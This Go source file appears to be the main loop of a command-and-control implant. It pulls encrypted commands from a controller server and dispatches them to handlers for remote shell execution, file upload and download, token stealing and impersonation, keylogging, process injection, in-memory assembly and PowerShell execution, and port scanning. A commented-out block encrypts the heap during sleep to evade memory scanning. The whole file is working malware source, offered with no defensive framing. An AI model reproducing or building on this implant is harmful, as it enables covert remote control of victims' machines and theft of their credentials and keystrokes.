package main

import (
	"bytes"
	"errors"
	"main/config"
	"main/crypt"
	"main/packet"
	"main/services"
	"time"
)

func main() {

	ok := packet.FirstBlood()
	if ok {
		var Token uintptr
		var powershellImport []byte
		for {
			data, err := packet.PullCommand()
			if data != nil && err == nil {
				totalLen := len(data)
				if totalLen > 0 {
					_ = data[totalLen-crypt.HmacHashLen:]
					restBytes := data[:totalLen-crypt.HmacHashLen]
					decrypted, errPacket := packet.DecryptPacket(restBytes)
					if errPacket != nil {
						packet.ErrorProcess(errPacket)
						continue
					}
					_ = decrypted[:4]
					lenBytes := decrypted[4:8]
					packetLen := packet.ReadInt(lenBytes)
					decryptedBuf := bytes.NewBuffer(decrypted[8:])
					for {
						if packetLen <= 0 {
							break
						}
						cmdType, cmdBuf, errParse := packet.ParsePacket(decryptedBuf, &packetLen)
						if errParse != nil {
							packet.ErrorProcess(errParse)
							continue
						}
						if cmdBuf != nil {
							//cmdBuf = []byte(strings.Trim(string(cmdBuf), "\x00"))
							//fmt.Printf("cmdType: %d\n",cmdType)
							//fmt.Printf("cmdBufferString: %s\n",cmdBuf)
							//fmt.Printf("cmdBuffer: %v\n",cmdBuf)
							var err error
							var callbackType int
							var result []byte
							switch cmdType {
							case packet.CMD_TYPE_SHELL:
								result, err = services.CmdShell(cmdBuf, Token)
								callbackType = 0
							case packet.CMD_TYPE_UPLOAD_START:
								result, err = services.CmdUploadStart(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_UPLOAD_LOOP:
								result, err = services.CmdUploadLoop(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_DOWNLOAD:
								result, err = services.CmdDownload(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_FILE_BROWSE:
								result, err = services.CmdFileBrowse(cmdBuf)
								callbackType = 22
							case packet.CMD_TYPE_CD:
								result, err = services.CmdCd(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_SLEEP:
								result, err = services.CmdSleep(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_PAUSE:
								result, err = services.CmdPause(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_PWD:
								result, err = services.CmdPwd()
								callbackType = 0
							case packet.CMD_TYPE_EXIT:
								result, err = services.CmdExit()
								callbackType = 0
							case packet.CMD_TYPE_SPAWN_X64:
								result, err = services.CmdSpawnX64(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_SPAWN_X86:
								result, err = services.CmdSpawnX86(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_EXECUTE:
								result, err = services.CmdExecute(cmdBuf, Token)
								callbackType = 0
							case packet.CMD_TYPE_GETUID:
								result, err = services.CmdGetUid()
								callbackType = 0
							case packet.CMD_TYPE_STEAL_TOKEN:
								Token, result, err = services.CmdStealToken(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_PS:
								result, err = services.CmdPs(cmdBuf)
								resultType := packet.ReadInt(cmdBuf)
								//fmt.Println(resultType)
								if resultType == 0 {
									callbackType = 17
								} else {
									callbackType = 22
								}
							case packet.CMD_TYPE_KILL:
								result, err = services.CmdKill(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_MKDIR:
								result, err = services.CmdMkdir(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_DRIVES:
								result, err = services.CmdDrives()
								callbackType = 0
							case packet.CMD_TYPE_RM:
								result, err = services.CmdRm(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_CP:
								result, err = services.CmdCp(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_MV:
								result, err = services.CmdMv(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_REV2SELF:
								Token, result, err = services.CmdRun2self(Token)
								callbackType = 0
							case packet.CMD_TYPE_MAKE_TOKEN:
								Token, result, err = services.CmdMakeToken(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_PIPE:
								result, err = services.CmdHandlerJob(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_PORTSCAN_X64:
								result, err = services.CmdPortscanX64(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_PORTSCAN_X86:
								result, err = services.CmdPortscanX86(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_KEYLOGGER:
								result, err = services.CmdKeylogger(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_EXECUTE_ASSEMBLY_X64:
								result, err = services.CmdExecuteAssemblyX64(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_EXECUTE_ASSEMBLY_X86:
								result, err = services.CmdExecuteAssemblyX86(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X64:
								result, err = services.CmdExecuteAssemblyX64(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X86:
								result, err = services.CmdExecuteAssemblyX86(cmdBuf)
							case packet.CMD_TYPE_IMPORT_POWERSHELL:
								result, err = services.CmdImportPowershell(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_POWERSHELL_PORT:
								result, err = services.CmdPowershellPort(cmdBuf, powershellImport)
								callbackType = 0
							case packet.CMD_TYPE_INJECT_X64:
								result, err = services.CmdInjectX64(cmdBuf)
								callbackType = 0
							case packet.CMD_TYPE_INJECT_X86:
								result, err = services.CmdInjectX86(cmdBuf)
								callbackType = 0
							default:
								err = errors.New("This type is not supported now.")
							}
							// convert charset here
							if err != nil {
								packet.ErrorProcess(err)
							} else {
								packet.DataProcess(callbackType, result)
							}
						}
					}
				}
			} else if err != nil {
				packet.ErrorProcess(err)
			}
			/*if config.Sleep_mask {
				packet.DoSuspendThreads()
				fmt.Println("EncryptHeap")
				packet.EncryptHeap()
				test := false
				windows.SleepEx(1000,test)
				packet.EncryptHeap()
				fmt.Println("DecryptHeap")
				packet.DoResumeThreads()
			} else {
				time.Sleep(config.WaitTime)
			}*/
			time.Sleep(config.WaitTime)

		}
	}

}
